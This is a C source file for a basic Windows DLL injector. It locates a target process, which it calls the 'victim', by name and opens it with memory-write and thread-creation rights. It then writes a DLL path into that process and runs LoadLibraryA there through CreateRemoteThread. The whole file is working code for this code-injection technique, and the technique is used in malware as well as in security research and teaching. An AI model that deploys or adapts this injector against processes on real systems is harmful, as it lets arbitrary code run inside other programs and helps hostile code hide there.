/*
* Basic Windows DLL injection using CreateRemoteThread and LoadLibrary
* Written by Brandon Arvanaghi (@arvanaghi). https://github.com/Arvanaghi/Windows-DLL-Injector
* 
* Usage:
		DLL_Injector.exe Receiver.exe C:\Windows\System32\cryptext.dll

  Note: code must be compiled with the bitness (x86 or x64) of the target process. 

* Many functions and comments taken from https://msdn.microsoft.com/en-us/library/windows/desktop/hh920508(v=vs.85).aspx
*/

#include "Windows.h"
#include "tlhelp32.h"
#include <strsafe.h>

#pragma warning(disable : 4996)

//  Forward declarations
HANDLE findProcess(WCHAR* processName);
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath);
void printError(LPCWSTR msg);

// Main
int wmain(int argc, wchar_t* argv[]) {
	// I only need the executable name as a wchar*, so I can conver the path to the DLL (the other command-line arg) to char[]
	char dllPath[MAX_PATH];
	wcstombs(dllPath, argv[2], MAX_PATH);

	// wprint to print WCHAR strings
	wprintf(L"Victim process name	: %s\n", argv[1]);
	wprintf(L"DLL to inject		: %s\n", argv[2]);

	HANDLE hProcess = findProcess(argv[1]);
	if (hProcess != NULL) {
		BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
		if (injectSuccessful) {
			printf("[+] DLL injection successful! \n");
			getchar();
		}
		else {
			printf("[---] DLL injection failed. \n");
			getchar();
		}
	}

}

/* Look for the process in memory
* Walks through snapshot of processes in memory, compares with command line argument
* Modified from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
*/
HANDLE findProcess(WCHAR* processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("[---] Could not create snapshot.\n");
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		printError(TEXT("Process32First"));
	
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do {

		if (!wcscmp(pe32.szExeFile, processName)) {
			wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);

			hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE , FALSE, pe32.th32ProcessID);  
			if (hProcess != NULL) {
				return hProcess;
			}
			else {
				wprintf(L"[---] Failed to open process %s.\n", pe32.szExeFile);
				return NULL;

			}
		}

	} while (Process32Next(hProcessSnap, &pe32));

	wprintf(L"[---] %s has not been loaded into memory, aborting.\n", processName);
	return NULL;
}

/* Load DLL into remote process
* Gets LoadLibraryA address from current process, which is guaranteed to be same for single boot session across processes
* Allocated memory in remote process for DLL path name
* CreateRemoteThread to run LoadLibraryA in remote process. Address of DLL path in remote memory as argument
*/
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {
	printf("Enter any key to attempt DLL injection.");
	getchar();

	// Allocate memory for DLL's path name to remote process
	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		printf("[---] VirtualAllocEx unsuccessful.\n");
		printError(TEXT("VirtualAllocEx"));
		getchar();
		return FALSE;
	}

	// Write DLL's path name to remote process
	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

	if (!succeededWriting) {
		printf("[---] WriteProcessMemory unsuccessful.\n");
		printError(TEXT("WriteProcessMemory"));
		getchar();
		return FALSE;
	}
	else {
		// Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
		LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddress == NULL) {
			printf("[---] LoadLibrary not found in process.\n");
			printError(TEXT("GetProcAddress"));
			getchar();
			return FALSE;
		}
		else {
			HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
			if (remoteThread == NULL) {
				printf("[---] CreateRemoteThread unsuccessful.\n");
				printError(TEXT("CreateRemoteThread"));
				return FALSE;
			}
		}
	}

	CloseHandle(hProcess);
	return TRUE;
}

// taken from https://docs.microsoft.com/en-us/windows/win32/debug/retrieving-the-last-error-code

void printError(LPCWSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	
}